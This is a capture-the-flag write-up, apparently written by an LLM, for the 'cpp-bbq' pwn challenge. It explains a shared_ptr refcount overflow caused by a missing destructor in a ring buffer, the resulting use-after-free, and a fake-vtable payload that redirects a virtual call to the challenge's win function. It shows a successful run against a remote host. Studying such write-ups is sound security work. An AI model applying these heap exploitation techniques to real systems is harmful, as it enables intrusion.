This is a LLM written write-up. You can refer to the other document for my (human) thoughts about the challenge.

# GreyCTF — `cpp-bbq` (pwn)

**Binary:** `chall` — x86-64 ELF, **no PIE**, Full RELRO, NX, stack canary.
Built with `g++ -std=c++20 -fno-pie -no-pie -Wl,-z,relro,-z,now` on Ubuntu 26.04
(glibc 2.43, libstdc++ 14). Source: `chall.cpp`.

The program is a tiny "RPG": a top-level menu (`battle`, `blacksmith`, `quit`),
a deterministic mini-game in `battle()`, and an item shop in `blacksmith()`. It
also ships a freebie:

```cpp
void win() {
    system("/bin/cat flag.txt");
    exit(0);
}
```

Because the binary is `-no-pie`, `win` lives at a **fixed** address
(`0x402476` in the shipped build), so the whole problem reduces to: *get one
controlled virtual call and point it at `win`.* No leak of any kind is required.

---

## 1. The bug — a missing destructor in a ring buffer

Notifications are stored in a fixed-capacity ring buffer:

```cpp
template<class T, size_t N>
class RingBuffer {
    alignas(T) unsigned char storage[N][sizeof(T)];
    size_t head = 0;
public:
    template<class... Args>
    void emplace(Args&&... args) {
        void* slot = storage[head];
        // BUG: if this slot already holds a live T, its destructor is NOT called.
        ::new (slot) T(std::forward<Args>(args)...);
        head = (head + 1) % N;
    }
};
```

Each element is an `ItemReceivedNotification`, which owns a
`std::shared_ptr<Item>`:

```cpp
struct ItemReceivedNotification { item_t item; std::string message; };
```

When `emplace` placement-news a new notification over an old, still-live slot,
the old notification's `shared_ptr` is overwritten **without being destroyed**.
Its strong reference is leaked: the control block's `_M_use_count` was bumped
when the slot was constructed and is never decremented.

`battle()` is the source of these notifications. Every queued reward is a copy of
`items[1]` (the global **Potion**):

```cpp
auto reward = items[1];                       // potion
for (uint32_t i = 0; i < reward_count; i++)
    notifications.emplace(ItemReceivedNotification{ .item = reward,
                                                    .message = "Battle reward" });
```

So **every `emplace` permanently increments the Potion control block's 32-bit
`_M_use_count`.**

### Winning the mini-game and the doubling

The monster's move is deterministic:

```cpp
static int oracle(int round) { return (round * round + round + 1) % 3; }
```

Answer `oracle(round)` each round and you keep winning. `reward_count` **doubles**
every exchange (`1, 2, 4, …`), and after you stop, that many notifications are
queued. A single battle can therefore queue up to `2^31` notifications
(`reward_count` is `uint32_t`).

### Overflowing the refcount

`_M_use_count` is a 32-bit `_Atomic_word`. Playing 32 battles that queue
`2^0, 2^1, …, 2^31` notifications adds

```
2^0 + 2^1 + … + 2^31 = 2^32 − 1
```

increments, wrapping the count back through zero. One final **losing** battle
constructs the temporary `auto reward = items[1]` and destroys it; that
`1 → 0` release runs `_Sp_counted_base::_M_release` → `_M_dispose` +
`_M_destroy`, which **frees the `make_shared` chunk** while the global `items[1]`
keeps pointing at it.

`make_shared<Potion>` is a single `_Sp_counted_ptr_inplace<Potion>` chunk:

```
chunk+0x00  _Sp_counted vtable
chunk+0x08  _M_use_count (4) | _M_weak_count (4)
chunk+0x10  Potion object:  +0x00 vtable | +0x08 name(std::string,0x20) | +0x28 int level
```

`sizeof == 0x40` → a **`0x50`** heap chunk. Call its user pointer `P`. After the
free: `tcache[0x50] = [P]`, `items[1]._M_ptr = P+0x10`, `items[1]._M_refcount = P`,
and `P` is dangling.

> The `2^32` `emplace`s are the only slow part: cache-missing writes across the
> 48 MB ring-buffer arena take ~15 minutes of server CPU. This is intrinsic to
> wrapping a 32-bit counter and cannot be avoided.

---

## 2. Blacksmith primitives

```
buy <id>          inventory.emplace_back(items[id]);  cout << items[id]->name;
rename <idx> <s>  inventory[idx]->name = s;     // std::string::operator=
inspect <idx>     inventory[idx]->inspect();    // virtual call
```

* **`rename`** is an arbitrary write: `operator=(const string&)` takes the
  in-place path (`memcpy` to `name._M_p`) whenever `len <= name.capacity()`.
* **`inspect`** is a controlled virtual dispatch. Disassembly:

  ```
  rdx = *(_M_ptr)        ; vtable
  rdx = *(rdx + 0x10)    ; vtable slot #2 (inspect)
  rdi = _M_ptr
  call *rdx
  ```

  i.e. `call *( *(_M_ptr) + 0x10 )` with `rdi = _M_ptr`.

Inputs are read with `std::cin >>`, so payloads may not contain whitespace bytes
`09 0a 0b 0c 0d 20` (NUL is fine).

---

## 3. Exploitation — fake object → `win`, no leak

After the free we have `tcache[0x50] = [P]` and a dangling `items[1]` at `P+0x10`.

The naive move — immediately `buy 1` to put the dangling Potion into the
inventory and `inspect` it — backfires: `buy` prints `items[1]->name`, and the
dangling object's `name._M_size` overlaps a heap-sized value, so `operator<<`
floods megabytes of heap. (Exactly this dump was the old exploit's fragile leak.)
We avoid it by **reclaiming `P` with controlled contents first**, so the
dangling object's `name._M_size` is small before it is ever printed.

```
buy 2                 inv[0] = Rock (a real Item)
rename 0 <0x40 bytes> Rock.name needs 0x40 bytes -> malloc(0x41) == 0x50 request
                      -> pops P off tcache. P is reclaimed; its bytes are ours.
```

The `0x40`-byte payload lays out a fake object at `P+0x10`:

| offset in P | field (object at P+0x10)      | value      | purpose                                   |
|-------------|-------------------------------|------------|-------------------------------------------|
| `+0x10`     | `vtable`                      | `AVT`      | fake vtable pointer                       |
| `+0x18`     | `name._M_p`                   | `AVT+0x10` | destination of the next arbitrary write   |
| `+0x20`     | `name._M_size`                | `8`        | **small** → the `buy 1` print is harmless |
| `+0x28`     | `name._M_capacity`            | `0x1000`   | big → next `rename` is in-place           |

`AVT` is any fixed writable address; we use `notifications + 0x800000` in `.bss`.

```
buy 1                 inv[1] = dangling items[1] (_M_ptr = P+0x10)
                      name is {AVT+0x10, size 8} -> prints 8 bytes, no flood
rename 1 <p64(win)>   inv[1]->name = win  ->  in-place write *(AVT+0x10) = win
inspect 1             this   = P+0x10
                      vtable = *(P+0x10) = AVT
                      call *(vtable+0x10) = *(AVT+0x10) = win()   ->  cat flag.txt
```

`win` begins with `endbr64`, and we reach it via an indirect `call`, so CET is
satisfied. `win` ignores its argument, so the `rdi = P+0x10` it receives is
irrelevant.

**No heap, libc, or PIE address is ever needed.** The only qword dereferenced in
`AVT` is `AVT+0x10`, which we overwrite ourselves immediately before the call, so
its prior `.bss` contents don't matter.

### Why it is reliable

* Every address is a fixed binary symbol (`win`, `notifications`).
* The single heap assumption is `tcache[0x50]` LIFO handing the just-freed `P` to
  the `0x40`-byte `rename` — version-independent glibc behavior, and `P` is the
  only `0x50` free between the bug and the reclaim.
* `name._M_size` is forced small before the dangling pointer is printed, so
  `std::cout` never floods and never enters an error state; each command's effect
  is independent of parsing the previous output.

---

## 4. Development workflow (`dev/dbg.cpp`)

A real run costs ~15 minutes (the `2^32` loop), which is hostile to iteration.
`dev/dbg.cpp` is the shipped source plus a single extra command, `dbgfree`, that
performs the exact post-overflow surgery instantly:

```cpp
int* use_count = (int*)((char*)items[1].get() - 0x10 + 8);
*use_count = 0;                 // == the result of the 2^32 wrap
{ item_t tmp = items[1]; }      // 0 -> 1 -> 0 release: frees the chunk
```

The resulting heap state is identical to the real free, so the entire blacksmith
finisher can be validated against `./dbg` in **seconds**. `exploit.py --dbg` does
exactly this. Only the (proven-correct) `2^32` battle loop is replaced; the
attack sequence transfers to `chall` verbatim.

---

## 5. Result

```
$ ./exploit.py 47.129.53.134 1337
...
[+] Potion freed; items[1] dangling. t=924s
blacksmith> grey{...}
[+] FLAG: grey{...}
```

First attempt, no retries, against the live remote — verified with a differential
control (a distinct local sentinel `flag.txt` never appears; the flag bytes
arrive over the socket from the remote host).

## Files
* `exploit.py` — final exploit. `./exploit.py` (local `./chall`),
  `./exploit.py HOST PORT` (remote), `./exploit.py --dbg` (fast self-test).
* `dev/dbg.cpp` — instrumented build with the `dbgfree` fast-path.
